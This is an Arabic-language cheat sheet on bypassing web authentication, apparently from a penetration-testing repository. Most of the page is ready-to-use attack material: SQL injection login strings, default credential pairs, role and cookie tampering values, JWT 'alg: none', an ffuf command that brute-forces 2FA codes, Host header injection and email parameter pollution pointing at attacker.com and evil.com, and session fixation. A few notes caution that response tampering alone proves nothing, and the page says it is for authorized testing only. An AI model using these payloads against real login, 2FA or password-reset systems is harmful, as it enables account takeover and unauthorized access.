<a id="-authentication-bypass-cheatsheet"></a>
# 🔐 مرجع سريع لتجاوز المصادقة

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

> يعرض الرسم النصي العنوان بالإنجليزية؛ تتناول هذه الصفحة تجاوز آليات إثبات هوية المستخدم (المصادقة).

---

<a id="-login-bypass-techniques"></a>
## 🔍 تقنيات تجاوز تسجيل الدخول

<a id="sql-injection"></a>
### حقن SQL
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

<a id="default-credentials"></a>
### بيانات الاعتماد الافتراضية
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

<a id="parameter-manipulation"></a>
### التلاعب بالمعاملات
```http
# تغيير نوع المستخدم
user_type=admin
role=administrator
isAdmin=true
admin=1

# تخطي التحقق
verified=true
mfa_verified=true
```

---

<a id="-2famfa-bypass"></a>
## 🔑 تجاوز المصادقة الثنائية أو متعددة العوامل (2FA/MFA)

<a id="response-manipulation"></a>
### التلاعب بالاستجابة
```http
# تغيير false إلى true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

<a id="status-code-manipulation"></a>
### التلاعب برمز حالة HTTP
```http
# إذا كان رمز الحالة 401/403، فجرّب تغييره إلى 200
# استخدام وسيط Proxy لتعديل الاستجابة
```

<a id="direct-navigation"></a>
### الانتقال المباشر
```http
# تخطي صفحة 2FA بعد تسجيل الدخول
/login → /2fa → /dashboard
# تجربة الانتقال مباشرةً إلى /dashboard
```

> **توضيح:** تغيير JSON أو رمز حالة الاستجابة في المتصفح أو الوسيط لا يثبت تجاوز المصادقة من جانب الخادم. تنجح هذه الأفكار فقط عند وجود خلل في التطبيق، مثل السماح بالوصول إلى الموارد المحمية قبل إتمام العامل الثاني. يوضّح المثال مسارًا للاختبار، ولا يضمن نجاحه. [شرح PortSwigger لتجاوز المصادقة الثنائية](https://portswigger.net/web-security/authentication/multi-factor).

<a id="code-bruteforce"></a>
### تخمين رموز التحقق بالقوة الغاشمة
```bash
# رموز من 4 أرقام
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

<a id="code-reuse"></a>
### إعادة استخدام رمز التحقق
```http
# تجربة رموز قديمة أو منتهية الصلاحية
# تجربة الرمز نفسه عدة مرات
```

<a id="nullempty-values"></a>
### القيم الفارغة أو null
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

<a id="-password-reset-bypass"></a>
## 🔓 تجاوز آلية إعادة تعيين كلمة المرور

<a id="host-header-injection"></a>
### حقن ترويسة Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

<a id="token-manipulation"></a>
### التلاعب بالرموز (Tokens)
```http
# رموز يمكن التنبؤ بها
token=1
token=admin
token=base64(user_id)

# إعادة استخدام الرمز
# استخدام رمز إعادة التعيين الخاص بك مع بريد الضحية
```

<a id="parameter-pollution"></a>
### تلوث المعاملات (Parameter Pollution)
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

<a id="response-manipulation-1"></a>
### التلاعب بالاستجابة
```json
// البحث عن الرمز في الاستجابة
{"token": "abc123", "email": "victim@target.com"}
```

---

<a id="-sessioncookie-bypass"></a>
## 🛡️ التجاوز عبر الجلسات وملفات تعريف الارتباط

<a id="cookie-manipulation"></a>
### التلاعب بملفات تعريف الارتباط
```http
# تغيير القيم
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

<a id="jwt-manipulation"></a>
### التلاعب برموز JSON Web Token ‏(JWT)
```json
// تغيير المطالبات (Claims)
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

> **تصحيح للمصطلح:** الحقل `alg` يخص ترويسة JOSE، وليس مجموعة المطالبات مثل `role`. وتغيير هذه القيم لا يكفي وحده لتجاوز التحقق؛ يجب أن توجد ثغرة في التحقق من التوقيع أو اختيار الخوارزمية أو تطبيق الصلاحيات. احتُفظ بأمثلة JSON الأصلية كما هي. [RFC 7515: معامل الترويسة alg](https://www.rfc-editor.org/rfc/rfc7515#section-4.1.1).

<a id="session-fixation"></a>
### تثبيت الجلسة (Session Fixation)
```http
# إسناد جلسة المهاجم إلى الضحية
# تسجّل الضحية الدخول باستخدام معرّف جلسة المهاجم
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

| نوع التجاوز | التقنية |
|-------------|-----------|
| تسجيل الدخول | حقن SQL وبيانات الاعتماد الافتراضية |
| المصادقة الثنائية (2FA) | التلاعب بالاستجابة والتخمين بالقوة الغاشمة |
| إعادة تعيين كلمة المرور | ترويسة Host وإعادة استخدام الرموز |
| الجلسة | التلاعب بملفات تعريف الارتباط وبرموز JWT |

<a id="common-vulnerable-points"></a>
### مواضع شائعة قد تكون عرضة للثغرات
```
- نماذج تسجيل الدخول
- مسارات إعادة تعيين كلمة المرور
- تطبيقات المصادقة الثنائية أو متعددة العوامل (2FA/MFA)
- وظائف تذكّر المستخدم (Remember me)
- التحقق من الحساب
- تطبيقات OAuth
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مرجع المصادقة من PortSwigger](https://portswigger.net/web-security/authentication)
- [تجاوز المصادقة من HackTricks](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 استكشاف تجاوز المصادقة!</b><br>
  <i>للاختبارات المصرّح بها فقط!</i>
</p>
